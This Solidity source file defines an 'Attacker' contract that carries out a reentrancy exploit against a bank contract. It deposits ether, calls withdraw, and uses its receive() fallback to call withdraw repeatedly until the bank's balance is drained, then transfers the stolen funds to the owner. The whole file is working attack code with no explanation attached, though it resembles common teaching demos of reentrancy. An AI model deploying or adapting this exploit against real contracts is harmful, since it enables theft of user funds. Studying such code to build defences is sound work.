// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank{
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable{

    IBank public immutable bankContract;

    constructor(address _bankContract){
        bankContract=IBank(_bankContract);
    }

    function attack() external payable onlyOwner{
        bankContract.deposit{value: msg.value}();
        bankContract.withdraw();
    }

    receive() external payable{
        if(address(bankContract).balance>0){
            bankContract.withdraw();
        }
        else {
            payable(owner()).transfer(address(this).balance);
        }
    }

}